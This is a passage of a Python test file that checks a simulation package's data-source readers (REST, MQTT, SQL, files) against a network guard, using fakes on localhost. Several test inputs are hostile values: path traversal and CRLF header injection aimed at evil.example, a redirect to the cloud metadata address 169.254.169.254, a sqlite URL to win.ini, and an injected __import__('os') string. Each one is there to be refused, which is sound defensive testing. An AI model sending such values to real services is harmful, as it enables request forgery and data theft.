"""The readers of `databind` (PHASE7 7.8): what each kind of data source reads.

`tests/data/source_frames.json` was written from the code as it was BEFORE the readers
became a table (D213) and is never edited afterwards: per kind, the frame's columns, dtype
kinds and values and whether a stamp came back; per refusal, its code, message and hint.
`describe` must keep giving exactly that file.
"""
import json
import socket
import sqlite3
import struct
import sys
import tempfile
import threading
import types
from contextlib import closing
from pathlib import Path
from unittest import mock

import pandas as pd
import pytest

from nagasim import databind, netguard, sources

BASELINE = Path(__file__).parent / "data" / "source_frames.json"
_ROWS = [("WO-1", 2, 1.5, "north"), ("WO-2", 4, 2.25, "south"), ("WO-3", 9, 0.5, "north")]
_COLUMNS = ["id", "quantity", "hours", "site"]
_ON = netguard.NetworkPolicy(allow_network=True)
_OFF = netguard.NetworkPolicy()


def _files(root: Path) -> None:
    frame = pd.DataFrame(_ROWS, columns=_COLUMNS)
    frame.to_csv(root / "orders.csv", index=False)
    frame.to_excel(root / "orders.xlsx", index=False, sheet_name="Sheet1")
    frame.to_excel(root / "named.xlsx", index=False, sheet_name="plan")
    with closing(sqlite3.connect(root / "orders.sqlite")) as conn:
        conn.execute("CREATE TABLE orders (id TEXT, quantity INTEGER, hours REAL, site TEXT)")
        conn.executemany("INSERT INTO orders VALUES (?, ?, ?, ?)", _ROWS)
        conn.commit()


# (case, source, policy): every kind read once, then every way a source is refused. No
# case contacts a service: netguard's opener (its test seam) and the resolver are replaced,
# and `sqlalchemy` is made unimportable so the answer does not depend on what is installed.
_CASES = [
    ("csv", {"kind": "csv", "location": "orders.csv"}, _OFF),
    ("csv-options", {"kind": "csv", "location": "orders.csv",
                     "options": {"usecols": ["id", "hours"], "dtype": {"hours": "str"}}}, _OFF),
    ("xlsx", {"kind": "xlsx", "location": "orders.xlsx"}, _OFF),
    ("xlsx-sheet", {"kind": "xlsx", "location": "named.xlsx", "sheet": "plan"}, _OFF),
    ("sqlite", {"kind": "sqlite", "location": "orders.sqlite",
                "query": "SELECT id, quantity * 2 AS twice FROM orders ORDER BY id DESC"}, _OFF),
    ("json_url-list", {"kind": "json_url", "location": "https://data.example/list"}, _ON),
    ("json_url-data", {"kind": "json_url", "location": "https://data.example/wrapped"}, _ON),
    ("sql-no-driver", {"kind": "sql", "location": "postgresql://user@db.example/plant",
                       "query": "SELECT 1"}, _ON),
    ("json_url-off", {"kind": "json_url", "location": "https://example.invalid/data.json"}, _OFF),
    ("sql-off", {"kind": "sql", "location": "postgresql://user@host/db", "query": "SELECT 1"},
     _OFF),
    ("sql-password", {"kind": "sql", "location": "postgresql://user:hunter2@host/db",
                      "query": "SELECT 1"}, _ON),
    ("sql-env-unset", {"kind": "sql", "query": "SELECT 1",
                       "location": "postgresql://user:${NAGASIM_DATA_NOT_SET_ANYWHERE}@host/db"},
     _ON),
    ("sql-env-name", {"kind": "sql", "location": "postgresql://user:${PATH}@host/db",
                      "query": "SELECT 1"}, _ON),
    ("sql-sqlite-url", {"kind": "sql", "location": "sqlite:///C:/Windows/win.ini",
                        "query": "SELECT 1"}, _ON),
    ("csv-unc", {"kind": "csv", "location": "\\\\server\\share\\orders.csv"}, _OFF),
    ("csv-missing", {"kind": "csv", "location": "missing.csv"}, _OFF),
    ("unknown-kind", {"kind": "parquet", "location": "orders.parquet"}, _OFF),
    ("unknown-kind-env", {"kind": "parquet", "location": "${NAGASIM_DATA_NOT_SET_ANYWHERE}"},
     _OFF),
    ("sqlite-missing-and-env", {"kind": "sqlite", "location": "missing.sqlite",
                                "query": "SELECT ${NAGASIM_DATA_NOT_SET_ANYWHERE}"}, _OFF),
]
_PAYLOADS = {"https://data.example/list": [{"id": "a", "n": 1}, {"id": "b", "n": 2.5}],
             "https://data.example/wrapped": {"data": [{"id": "a", "ok": True}]}}


def _public(host, *_args, **_kwargs):
    return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 0))]


class _Response:
    def __init__(self, body: bytes):
        self.body, self.headers = body, {"Content-Length": str(len(body))}

    def __enter__(self):
        return self

    def __exit__(self, *_exc):
        return False

    def read(self, limit):
        return self.body[:limit]


class _Opener:
    def open(self, request, timeout=None):
        return _Response(json.dumps(_PAYLOADS[request.full_url]).encode())


def describe(root: Path) -> dict:
    """What `_read_source` gives for every case, as plain JSON data."""
    _files(root)
    out = {}
    with mock.patch.object(netguard, "_opener", lambda policy: _Opener()), \
            mock.patch.object(socket, "getaddrinfo", _public), \
            mock.patch.dict(sys.modules, {"sqlalchemy": None}):
        for name, source, policy in _CASES:
            try:
                frame, stamp = databind._read_source({"name": "s", **source}, root, policy, None)
            except (databind._BindingError, netguard.GuardError) as exc:
                # The hint of an unknown kind lists the kinds, and the list grows.
                hint = None if exc.code == "E_DATA_SOURCE_KIND" else exc.hint
                out[name] = {"code": exc.code, "message": exc.message, "hint": hint}
            else:
                out[name] = {"columns": [str(c) for c in frame.columns],
                             "kinds": [dtype.kind for dtype in frame.dtypes],
                             "values": json.loads(frame.to_json(orient="values")),
                             "stamp": stamp is not None}
    return out


def write_baseline() -> None:
    with tempfile.TemporaryDirectory() as folder:
        BASELINE.write_text(json.dumps(describe(Path(folder)), indent=1, sort_keys=True) + "\n",
                            encoding="utf-8")


def test_every_kind_reads_what_the_baseline_says(tmp_path):
    assert describe(tmp_path) == json.loads(BASELINE.read_text(encoding="utf-8"))


# ---------------------------------------------------------------- the table (D213)
def test_the_table_holds_exactly_the_declared_kinds():
    from nagasim.core import schema

    assert tuple(databind.READERS) == schema.DATA_SOURCE_KINDS
    assert all(reader.kind == kind for kind, reader in databind.READERS.items())
    assert {r.target for r in databind.READERS.values()} <= {"file", "url", "sql", "connection"}


def _remote_kinds():
    return [kind for kind, reader in databind.READERS.items() if reader.target != "file"]


@pytest.mark.parametrize("kind", _remote_kinds())
def test_a_reader_that_leaves_the_machine_is_refused_before_it_is_called(kind, monkeypatch,
                                                                        tmp_path):
    """Rule 10, for every reader the table will ever hold: with the default policy the
    refusal comes from the guard, and neither the reader nor the resolver is reached."""
    called = []
    reader = databind.READERS[kind]
    monkeypatch.setitem(databind.READERS, kind, databind.Reader(
        kind, lambda *args: called.append(args), target=reader.target))
    monkeypatch.setattr(socket, "getaddrinfo", lambda *a, **k: called.append(a))
    source = {"name": "s", "kind": kind, "location": "https://data.example/x",
              "connection": "line", "query": "SELECT 1"}
    with pytest.raises(netguard.GuardError) as caught:
        databind._read_source(source, tmp_path, netguard.NetworkPolicy(), None)
    assert caught.value.code in ("E_DATA_NETWORK_REFUSED", "E_DATA_CONNECTION")
    assert called == []


def test_read_rows_gives_plain_rows_through_the_same_guard(tmp_path):
    _files(tmp_path)
    rows, stamp = databind.read_rows({"name": "s", "kind": "csv", "location": "orders.csv"},
                                     tmp_path)
    assert rows[0] == {"id": "WO-1", "quantity": 2, "hours": 1.5, "site": "north"}
    assert [type(v) for v in rows[0].values()] == [str, int, float, str] and stamp
    json.dumps(rows)
    with pytest.raises(netguard.GuardError):
        databind.read_rows({"name": "s", "kind": "csv", "location": "../orders.csv"},
                           tmp_path / "sub", confine_to=tmp_path / "sub")


def test_a_readers_coded_failure_is_the_bindings_problem(tmp_path, monkeypatch):
    """`sources.ReadError` is how a reader that cannot import `databind` fails; rows that
    are not a frame become one."""
    from nagasim import sources
    from nagasim.core import schema

    def fails(*_args):
        raise sources.ReadError("E_DATA_READ", "HTTP 500 from connection 'mes'", "ask the owner")

    _files(tmp_path)
    doc = schema.migrate({
        "data_sources": [{"name": "s", "kind": "csv", "location": "orders.csv"}],
        "data_bindings": [{"name": "b", "source": "s", "column": "quantity",
                           "transform": "sum", "target": "simulation.replications"}]})
    monkeypatch.setitem(databind.READERS, "csv", databind.Reader("csv", fails))
    _resolved, report = databind.resolve_bindings(doc, tmp_path)
    assert [(p.code, p.hint) for p in report.problems] == [("E_DATA_READ", "ask the owner")]
    assert "HTTP 500 from connection 'mes'" in report.problems[0].message

    monkeypatch.setitem(databind.READERS, "csv", databind.Reader(
        "csv", lambda *_args: ([{"quantity": 2}, {"quantity": 5}], None)))
    resolved, report = databind.resolve_bindings(doc, tmp_path)
    assert report.ok and resolved["simulation"]["replications"] == 7


# ================================================================ live readers (PHASE7 7.8)
# Every test below runs against a fake on 127.0.0.1 written in the test code; `plant_net`
# (tests/conftest.py) answers every name from a table and fails a connect to anywhere else.
def _policy(*connections) -> netguard.NetworkPolicy:
    return netguard.NetworkPolicy(connections={c.name: c for c in connections})


def _live_model(source: dict, **binding) -> dict:
    from nagasim.core import schema

    binding = {"name": "b", "source": source["name"], "column": "quantity", "transform": "sum",
               "target": "simulation.replications", **binding}
    return schema.migrate({"data_sources": [source], "data_bindings": [binding]})


def test_the_live_kinds_are_declared_once_in_each_place(monkeypatch):
    """Core declares the kinds and their option names (it may not import a reader); the
    reader package and each reader must say the same."""
    from nagasim import readers
    from nagasim.core import schema

    assert readers.KINDS == schema.CONNECTION_SOURCE_KINDS
    assert set(readers.KINDS) <= set(netguard.CONNECTION_KINDS)
    for kind in readers.KINDS:
        assert databind.READERS[kind].target == "connection"
        assert tuple(readers.load(kind).OPTIONS) == schema.LIVE_SOURCE_OPTIONS[kind]
    with pytest.raises(sources.ReadError):
        readers.load("csv")


def test_a_live_source_is_validated_as_a_name_a_path_and_known_options():
    from nagasim.core import schema

    def codes(**source):
        doc = schema.migrate({"data_sources": [{"name": "s", "kind": "rest", **source}]})
        return [p.code for p in schema.validate_model_structured(doc)]

    assert codes(connection="mes", location="orders?open=1", options={"key": "id"}) == []
    assert codes(location="orders") == ["E_DATA_CONNECTION"]
    assert codes(connection="mes", location="https://mes.example/orders") == ["E_DATA_SOURCE_LOCATION"]
    assert codes(connection="mes", location="//mes.example/orders") == ["E_DATA_SOURCE_LOCATION"]
    assert codes(connection="mes", location="orders", options={"verify": False, "key": "id"}) == [
        "E_DATA_SOURCE_OPTION"]
    assert codes(connection="mes", location="") == ["E_DATA_SOURCE_LOCATION"]


# ---------------------------------------------------------------- REST (D221)
_ORDERS = [{"id": "WO-1", "quantity": 2, "site": "north", "tags": ["a"], "meta": {"x": 1}},
           {"id": "WO-2", "quantity": 5, "site": "south", "tags": [], "meta": None}]


def _rest(port, **fields) -> netguard.Connection:
    base = {"name": "mes", "kind": "rest", "scheme": "http", "host": "mes.plant.test",
            "port": port, "path": "/api/v2", "private": True}
    return netguard.Connection(**{**base, **fields})


def _orders_source(**fields) -> dict:
    return {"name": "orders", "kind": "rest", "connection": "mes", "location": "orders",
            "options": {"key": "id"}, **fields}


def test_a_rest_source_binds_rows_read_with_one_get(rest_plant, tmp_path):
    port, seen = rest_plant({"/api/v2/orders": _ORDERS,
                             "/api/v2/wrapped?open=1": {"items": _ORDERS[:1], "next": "/x"}})
    policy = _policy(_rest(port))
    resolved, report = databind.resolve_bindings(_live_model(_orders_source()), tmp_path,
                                                 network=policy)
    assert report.ok and resolved["simulation"]["replications"] == 7
    assert report.records[0].source_time and report.records[0].kind == "rest"
    # A cell that is not a scalar is left out: a row is data.
    rows, _stamp = databind.read_rows(_orders_source(), network=policy)
    assert rows == [{"id": "WO-1", "quantity": 2, "site": "north", "meta": None},
                    {"id": "WO-2", "quantity": 5, "site": "south", "meta": None}]
    wrapped = _orders_source(location="/wrapped?open=1", options={"records": "items"})
    assert [r["id"] for r in databind.read_rows(wrapped, network=policy)[0]] == ["WO-1"]

    assert {method for method, _path, _headers in seen} == {"GET"}
    assert [path for _m, path, _h in seen] == ["/api/v2/orders", "/api/v2/orders",
                                               "/api/v2/wrapped?open=1"]
    headers = seen[0][2]
    assert headers["Accept-Encoding"] == "identity" and headers["Host"] == f"mes.plant.test:{port}"
    assert not {"Authorization", "Cookie", "Proxy-Authorization"} & set(headers)


@pytest.mark.parametrize("fields, header, value", [
    ({"auth": "bearer"}, "Authorization", "Bearer t0k3n-Canary"),
    ({"auth": "basic", "username": "twin"}, "Authorization", "Basic dHdpbjp0MGszbi1DYW5hcnk="),
    ({"auth": "header", "header": "X-Api-Key"}, "X-Api-Key", "t0k3n-Canary"),
])
def test_a_credential_travels_in_one_header_and_never_in_the_address(fields, header, value,
                                                                     rest_plant):
    port, seen = rest_plant({"/api/v2/orders": _ORDERS})
    conn = _rest(port, secret=netguard.Secret("t0k3n-Canary"), **fields)
    assert len(databind.read_rows(_orders_source(), network=_policy(conn))[0]) == 2
    _method, path, headers = seen[0]
    assert headers[header] == value and "Canary" not in path
    assert [name for name, sent in headers.items() if "Canary" in sent or "dHdpbjp" in sent] == [header]


# A location is a path under the connection's own; whatever names another place is refused
# before a socket opens, however it is encoded.
_BAD_LOCATIONS = ["http://evil.example/x", "//evil.example/x", "../admin", "a/../../admin",
                  "..%2fadmin", "%2e%2e/admin", "%252e%252e%252fadmin", "a\\..\\admin",
                  "user@evil.example/x", "orders#frag", "orders%23frag", "orders list",
                  "orders\r\nHost: evil.example", "orders%0d%0aX: y", "admin", "ordersX"]


@pytest.mark.parametrize("location", _BAD_LOCATIONS)
def test_a_rest_location_cannot_name_another_place(location, rest_plant):
    port, seen = rest_plant({})
    policy = _policy(_rest(port, root="/orders"))
    with pytest.raises(sources.ReadError) as caught:
        databind.read_rows(_orders_source(location=location), network=policy)
    assert caught.value.code == "E_DATA_SOURCE_LOCATION" and seen == []


def test_a_rest_location_under_its_root_is_read_and_nothing_in_it_is_expanded(rest_plant,
                                                                              monkeypatch):
    monkeypatch.setenv("NAGASIM_DATA_SITE", "S3cr3t-Canary")
    port, seen = rest_plant({})
    policy = _policy(_rest(port, root="orders/"))
    for location in ("orders", "/orders/open?site=${NAGASIM_DATA_SITE}", "orders/a%20b"):
        with pytest.raises(sources.ReadError) as caught:        # the fake has no such route
            databind.read_rows(_orders_source(location=location), network=policy)
        assert caught.value.code == "E_DATA_READ" and caught.value.status == 404
    assert [path for _m, path, _h in seen] == [
        "/api/v2/orders", "/api/v2/orders/open?site=${NAGASIM_DATA_SITE}", "/api/v2/orders/a%20b"]


def _slow(handler):
    import time

    handler.send_response(200)
    handler.end_headers()
    for _ in range(40):
        handler.wfile.write(b" ")
        handler.wfile.flush()
        time.sleep(0.05)


# (route answer, connection limits, code, what the message says)
_REST_FAILURES = [
    ((500, {}, b"boom: t0k3n-Canary"), (), "E_DATA_READ", "HTTP 500 from connection 'mes'"),
    ((401, {"WWW-Authenticate": "t0k3n-Canary"}, b""), (), "E_DATA_READ", "HTTP 401"),
    ((302, {"Location": "/api/v2/elsewhere"}, b""), (), "E_DATA_URL_REDIRECT", "never followed"),
    ((307, {"Location": "http://169.254.169.254/"}, b""), (), "E_DATA_URL_REDIRECT", "redirect"),
    ((200, {}, b"<html>t0k3n-Canary</html>"), (), "E_DATA_READ", "did not answer with JSON"),
    ((200, {}, b'{"id": 1}'), (), "E_DATA_READ", "not a JSON array of objects"),
    ((200, {}, b"[1, 2]"), (), "E_DATA_READ", "not a JSON array of objects"),
    ((200, {}, b"[" * 200_000), (), "E_DATA_READ", "did not answer with JSON"),
    ((200, {}, b"\xff\xfe"), (), "E_DATA_READ", "did not answer with JSON"),
    ((200, {"Content-Length": "999999999999"}, b"[]"), (), "E_DATA_TOO_LARGE", "declares"),
    ((200, {}, b"[" + b" " * 500 + b"]"), (("bytes", 100),), "E_DATA_TOO_LARGE", "byte cap"),
    ((200, {}, b'[{"a": 1}, {"a": 2}, {"a": 3}]'), (("rows", 2),), "E_DATA_TOO_LARGE", "row cap"),
    (_slow, (), "E_DATA_READ", "no answer within the deadline"),
]


@pytest.mark.parametrize("answer, limits, code, said", _REST_FAILURES)
def test_every_way_a_rest_read_fails_is_coded_whole_and_quotes_nothing(answer, limits, code,
                                                                       said, rest_plant,
                                                                       monkeypatch, caplog):
    """The REST column of the failure matrix. A read is whole or it failed; what the server
    said is never quoted, so a secret it echoes back does not reach a problem or a log."""
    import logging

    from nagasim.readers import rest

    monkeypatch.setattr(rest, "READ_TIMEOUT", 0.4)
    port, seen = rest_plant({"/api/v2/orders": answer, "/api/v2/elsewhere": _ORDERS})
    conn = _rest(port, auth="bearer", secret=netguard.Secret("t0k3n-Canary"), limits=limits)
    with caplog.at_level(logging.DEBUG):
        resolved, report = databind.resolve_bindings(_live_model(_orders_source()), None,
                                                     network=_policy(conn))
    assert [p.code for p in report.problems] == [code] and report.overrides == []
    assert said in report.problems[0].message
    shown = "\n".join([json.dumps([p.as_dict() for p in report.problems]), repr(report),
                       report.frame().to_csv(), caplog.text])
    assert "Canary" not in shown and "boom" not in shown
    assert [path for _m, path, _h in seen] == ["/api/v2/orders"]      # nothing was followed


def test_a_rest_endpoint_that_is_down_keeps_its_last_rows_in_a_feed(rest_plant):
    from nagasim import live

    clock = [100.0]
    routes = {"/api/v2/orders": _ORDERS}
    port, seen = rest_plant(routes)
    with live.Feed([_orders_source()], network=_policy(_rest(port)), clock=lambda: clock[0],
                   monotonic=lambda: clock[0]) as feed:
        first = feed.changes("orders")
        assert [e.key for e in first.events] == ["WO-1", "WO-2"] and first.state == "live"
        routes["/api/v2/orders"] = (503, {}, b"")
        clock[0] += 5
        down = feed.changes("orders", first.cursor)
        assert (down.state, down.events) == ("down", ()) and down.problems[0].code == "E_DATA_READ"
        assert [r["id"] for r in feed.rows("orders")[0]] == ["WO-1", "WO-2"]
        routes["/api/v2/orders"] = [{**_ORDERS[0], "quantity": 3}, _ORDERS[1]]
        clock[0] += 1                                   # the 1 s backoff has passed
        back = feed.changes("orders", first.cursor)
        assert back.state == "live" and [(e.key, e.value["quantity"]) for e in back.events] == [
            ("WO-1", 3)]
        assert feed.status("orders")["channel"] == "plain" and len(seen) == 3


def test_rest_over_tls_is_verified_and_a_token_never_goes_out_in_plain_text(rest_plant, tls_files,
                                                                           plant_net):
    port, seen = rest_plant({"/orders": _ORDERS}, tls=True)
    secret = netguard.Secret("t0k3n-Canary")
    good = _rest(port, scheme="https", host="plant.test", path="", auth="bearer", secret=secret,
                 ca_file=tls_files[0])
    assert len(databind.read_rows(_orders_source(), network=_policy(good))[0]) == 2
    assert seen[0][2]["Authorization"] == "Bearer t0k3n-Canary"
    for conn, code in ((_rest(port, scheme="https", host="other.test", path="", auth="bearer",
                              secret=secret, ca_file=tls_files[0]), "E_DATA_TLS"),
                       (_rest(port, scheme="https", host="plant.test", path=""), "E_DATA_TLS")):
        with pytest.raises(netguard.NetworkRefused) as caught:
            databind.read_rows(_orders_source(), network=_policy(conn))
        assert caught.value.code == code
    # In plain text to another machine: refused before any socket (`plant_net` would fail
    # the test if one were dialled).
    plant_net["mes.plant.test"] = ["10.20.0.8"]
    with pytest.raises(netguard.NetworkRefused) as caught:
        databind.read_rows(_orders_source(), network=_policy(_rest(80, auth="bearer",
                                                                    secret=secret)))
    assert caught.value.code == "E_DATA_PLAINTEXT_CREDENTIAL" and len(seen) == 1


def test_what_a_live_source_sends_is_data_and_only_data(rest_plant, tmp_path):
    """D225: a text from a plant is never written into a model field (it could be read as
    a name or an expression); a number, a true/false value and an order book are. A column
    beyond the order fields rides along as an order attribute (#677): a value an expression
    reads, never one it evaluates."""
    rows = [{"id": "WO-1", "quantity": 4, "unit": "__import__('os')", "ok": True,
             "entity_type": "Widget", "due": 480}]
    port, _seen = rest_plant({"/api/v2/orders": rows})
    policy = _policy(_rest(port))

    def bind(**binding):
        doc = _live_model(_orders_source(), **binding)
        doc["orders"] = [{"id": "OLD", "release": 0, "due": 1}]
        return databind.resolve_bindings(doc, tmp_path, network=policy)

    _resolved, report = bind(column="unit", transform="value", target="simulation.time_unit")
    assert [p.code for p in report.problems] == ["E_DATA_TYPE"] and report.overrides == []
    resolved, report = bind(column="quantity", transform="value")
    assert report.ok and resolved["simulation"]["replications"] == 4
    resolved, report = bind(transform="orders", target="orders", column="")
    assert report.ok and resolved["orders"] == [
        {"id": "WO-1", "due": 480.0, "quantity": 4, "entity_type": "Widget",
         "attributes": {"unit": "__import__('os')", "ok": "True"}}]


def test_a_cycle_reads_its_live_sources_from_its_own_feed(rest_plant, tmp_path):
    """`resolve_bindings(feed=)` and `api.run_model(feed=)`: the caller's feed answers, so a
    changed row is picked up by the next cycle without a new feed."""
    from nagasim import api, live

    from conftest import chain, create, dispose, layout

    blocks = [create(max_arrivals=1), dispose()]
    doc = layout(blocks, chain(*blocks), simulation={"time_limit": 5, "warmup": 0,
                                                     "replications": 1, "time_unit": "minutes"})
    doc["data_sources"] = [_orders_source(options={"key": "id", "poll": 1})]
    doc["data_bindings"] = [{"name": "b", "source": "orders", "column": "quantity",
                             "transform": "sum", "target": "simulation.replications"}]
    routes = {"/api/v2/orders": _ORDERS}
    port, seen = rest_plant(routes)
    clock = [100.0]
    with live.Feed(doc["data_sources"], network=_policy(_rest(port)), clock=lambda: clock[0],
                   monotonic=lambda: clock[0]) as feed:
        resolved, report = databind.resolve_bindings(doc, tmp_path, feed=feed)
        assert report.ok and resolved["simulation"]["replications"] == 7
        routes["/api/v2/orders"] = _ORDERS[:1]
        clock[0] += 1
        results = api.run_model(doc, bind_data=True, base_dir=tmp_path, feed=feed, run_length=5)
        assert results["data_inputs"]["Value"].iloc[0] == "2" and len(seen) == 2
    # Without a feed and without the caller's connection: refused, and nothing was opened.
    _resolved, report = databind.resolve_bindings(doc, tmp_path)
    assert [p.code for p in report.problems] == ["E_DATA_CONNECTION"] and len(seen) == 2


def test_an_agent_reads_a_live_source_only_through_the_connection_given_at_start(rest_plant,
                                                                                tmp_path):
    """D226: no tool and no parameter. The workspace's policy, fixed when the server starts,
    is the only way a connection reaches a tool; a model that names one opens nothing."""
    import shutil

    from nagasim import agent_tools as T

    banned = {"connection", "connections", "host", "port", "url", "secret", "password", "token",
              "ca_file", "limits", "private"}
    for spec in T.tool_schemas():
        assert not banned & set(spec["input_schema"]["properties"]), spec["name"]

    port, seen = rest_plant({"/api/v2/orders": _ORDERS})
    shutil.copy(Path(__file__).resolve().parents[1] / "nagasim" / "models" / "single_server.json",
                tmp_path / "single_server.json")
    for policy, problems, requests in ((None, 1, 0), (_policy(_rest(port)), 0, 1)):
        T.use_workspace(T.Workspace(tmp_path, network=policy))
        assert "error" not in T.call("open_model", path="single_server.json", name="m")
        doc = T.workspace().models["m"]
        doc.set_data_sources([_orders_source()])
        doc.set_data_bindings([{"name": "b", "source": "orders", "column": "quantity",
                                "transform": "sum", "target": "simulation.replications",
                                "enabled": True}])
        answer = T.call("resolve_data_bindings", model="m")
        assert answer["problems"] == problems and len(seen) == requests, answer
    assert answer["bindings"][0]["value"] == 7


# ---------------------------------------------------------------- `naga watch`
def _watch_files(tmp_path, port):
    model = tmp_path / "model.json"
    model.write_text(json.dumps({"data_sources": [
        _orders_source(), {"name": "file", "kind": "csv", "location": "orders.csv"}]}),
        encoding="utf-8")
    connections = tmp_path / "connections.json"
    connections.write_text(json.dumps({"format": 1, "connections": {
        "mes": {"kind": "rest", "url": f"http://mes.plant.test:{port}/api/v2", "private": True},
        "unused": {"kind": "mqtt", "url": "mqtts://broker.plant.test"}}}), encoding="utf-8")
    return str(model), str(connections)


def test_naga_watch_prints_events_and_records_them_one_object_per_line(rest_plant, tmp_path,
                                                                       capsys):
    from nagasim import cli, live

    assert cli.COMMANDS["watch"][:2] == ("live", "main")
    port, seen = rest_plant({"/api/v2/orders": _ORDERS})
    model, connections = _watch_files(tmp_path, port)
    record = tmp_path / "events.jsonl"
    assert live.main([model, "--connections", connections, "--for", "0.2",
                      "--record", str(record)]) == 0
    out = capsys.readouterr().out.splitlines()
    assert out[0] == (f"mes: http://mes.plant.test:{port}/api/v2 -> 127.0.0.1, plain, anonymous, "
                      f"no root (anything it serves)")
    assert out[1].startswith("orders  'WO-1' = {'id': 'WO-1'") and len(out) == 4
    assert out[-1] == "orders: live, 2 events, 0 lost, 0 gaps, channel plain"
    lines = [json.loads(line) for line in record.read_text(encoding="utf-8").splitlines()]
    assert [set(line) for line in lines] == [
        {"source", "key", "value", "source_time", "received", "seq"}] * 2
    assert [(line["key"], line["seq"]) for line in lines] == [("WO-1", 1), ("WO-2", 2)]
    assert {method for method, _p, _h in seen} == {"GET"}


def test_naga_watch_check_connects_once_and_says_what_is_wrong(rest_plant, tmp_path, capsys):
    from nagasim import live

    port, seen = rest_plant({"/api/v2/orders": _ORDERS})
    model, connections = _watch_files(tmp_path, port)
    assert live.main([model, "--connections", connections, "--check"]) == 0
    assert len(seen) == 1 and "orders: live" in capsys.readouterr().out

    port, seen = rest_plant({})                         # the route is gone: HTTP 404
    model, connections = _watch_files(tmp_path, port)
    assert live.main([model, "--connections", connections, "--check"]) == 1
    assert "HTTP 404 from connection 'mes'" in capsys.readouterr().out
    assert live.main([model, "--connections", connections, "--source", "file"]) == 1
    assert capsys.readouterr().out == "no live data source to watch\n"
    with pytest.raises(ValueError):                     # one line on the command line
        live.main([model, "--connections", str(tmp_path / "missing.json")])


# ---------------------------------------------------------------- MQTT (D222)
# The broker below is written here with `struct`, from the MQTT 3.1.1 specification, and
# shares no code with the reader: a mistake in one is not repeated in the other.
def _mq_text(value: str) -> bytes:
    data = value.encode("utf-8")
    return struct.pack(">H", len(data)) + data


def _mq_frame(first: int, body: bytes) -> bytes:
    length, out = len(body), bytearray([first])
    while True:
        out.append(length % 128 | (0x80 if length >= 128 else 0))
        length //= 128
        if not length:
            return bytes(out) + body


class _Broker:
    """A scripted broker on 127.0.0.1. It records what every client sent (`connects`,
    `subscribes`, `packets` as (type, flags)) and sends what the test hands it."""

    def __init__(self, tls_files=None, connack=0, suback=None):
        import ssl

        self.connack, self.suback, self.puback = connack, suback, True
        self.connects, self.subscribes, self.packets, self.published = [], [], [], []
        self.client = None
        self.ready = threading.Event()
        self.context = None
        if tls_files:
            self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            self.context.load_cert_chain(*tls_files)
        self.server = socket.socket()
        self.server.bind(("127.0.0.1", 0))
        self.server.listen()
        self.port = self.server.getsockname()[1]
        threading.Thread(target=self._serve, daemon=True).start()

    def _read(self, client, size):
        data = b""
        while len(data) < size:
            chunk = client.recv(size - len(data))
            if not chunk:
                raise OSError("closed")
            data += chunk
        return data

    def _packet(self, client):
        first = self._read(client, 1)[0]
        length = shift = 0
        while True:
            byte = self._read(client, 1)[0]
            length |= (byte & 0x7F) << shift
            shift += 7
            if not byte & 0x80:
                return first >> 4, first & 0x0F, self._read(client, length)

    def _serve(self):
        while True:
            try:
                client, _peer = self.server.accept()
                if self.context is not None:
                    client = self.context.wrap_socket(client, server_side=True)
            except OSError:
                if self.server.fileno() == -1:
                    return
                continue
            # A client a thread: the outbox's sink publishes while its replies are subscribed.
            threading.Thread(target=self._serve_one, args=(client,), daemon=True).start()

    def _serve_one(self, client):
        try:
            self._session(client)
        except OSError:
            pass
        finally:
            if client is self.client:
                self.ready.clear()
            client.close()

    def _session(self, client):
        while True:
            kind, flags, body = self._packet(client)
            self.packets.append((kind, flags))
            if kind == 1:                                       # CONNECT
                assert body[:7] == b"\x00\x04MQTT\x04", body[:7]
                connect_flags, keepalive = body[7], struct.unpack(">H", body[8:10])[0]
                fields, pos = [], 10
                while pos < len(body):
                    size = struct.unpack(">H", body[pos:pos + 2])[0]
                    fields.append(body[pos + 2:pos + 2 + size].decode())
                    pos += 2 + size
                self.connects.append({"flags": connect_flags, "keepalive": keepalive,
                                      "fields": fields})
                client.sendall(bytes([0x20, 2, 0, self.connack]))
            elif kind == 8:                                     # SUBSCRIBE
                assert flags == 2
                found, pos = [], 2
                while pos < len(body):
                    size = struct.unpack(">H", body[pos:pos + 2])[0]
                    found.append((body[pos + 2:pos + 2 + size].decode(), body[pos + 2 + size]))
                    pos += 3 + size
                self.subscribes.append(found)
                granted = self.suback or bytes(qos for _f, qos in found)
                client.sendall(_mq_frame(0x90, body[:2] + granted))
                self.client = client
                self.ready.set()
            elif kind == 3:                                     # PUBLISH, from a sink
                size = struct.unpack(">H", body[:2])[0]
                topic, rest = body[2:2 + size].decode(), body[2 + size:]
                qos = flags >> 1 & 3
                self.published.append({"topic": topic, "flags": flags, "payload": rest[2:] if qos else rest})
                if qos == 1 and self.puback:
                    client.sendall(bytes([0x40, 2]) + rest[:2])
            elif kind == 12:                                    # PINGREQ
                client.sendall(bytes([0xD0, 0]))
            elif kind == 14:                                    # DISCONNECT
                return

    def publish(self, topic, payload: bytes, qos=0, packet_id=7):
        assert self.ready.wait(5), "no client subscribed"
        body = _mq_text(topic) + (struct.pack(">H", packet_id) if qos else b"") + payload
        self.client.sendall(_mq_frame(0x30 | qos << 1, body))

    def raw(self, data: bytes):
        assert self.ready.wait(5), "no client subscribed"
        self.client.sendall(data)

    def drop(self):
        assert self.ready.wait(5), "no client subscribed"
        self.ready.clear()
        # Not close(): the serving thread is blocked in recv() on this socket, and on Linux
        # and macOS a close from another thread neither wakes it nor ends the connection.
        self.client.shutdown(socket.SHUT_RDWR)

    def close(self):
        self.server.close()


@pytest.fixture
def broker(plant_net, tls_files):
    """`broker(**kwargs) -> _Broker`; every broker is closed at teardown."""
    made = []

    def start(tls=False, **kwargs):
        made.append(_Broker(tls_files if tls else None, **kwargs))
        return made[-1]

    yield start
    for one in made:
        one.close()


def _mqtt(port, **fields) -> netguard.Connection:
    base = {"name": "line", "kind": "mqtt", "scheme": "mqtt", "host": "broker.plant.test",
            "port": port, "private": True}
    return netguard.Connection(**{**base, **fields})


def _topics(location="plant/#", **options) -> dict:
    return {"name": "line", "kind": "mqtt", "connection": "line", "location": location,
            "options": {"settle": 0.3, **options}}


def _until(feed, source, wanted, cursor=None, seconds=5.0):
    """The events of *source* since *cursor*, collected until *wanted* of them arrived."""
    import time

    events, deadline = [], time.monotonic() + seconds
    while len(events) < wanted and time.monotonic() < deadline:
        got = feed.changes(source, cursor)
        cursor = got.cursor
        events += got.events
        if len(events) < wanted:
            feed.wait(0.2)
    assert len(events) >= wanted, events
    return events, cursor


def _eventually(check, seconds=5.0):
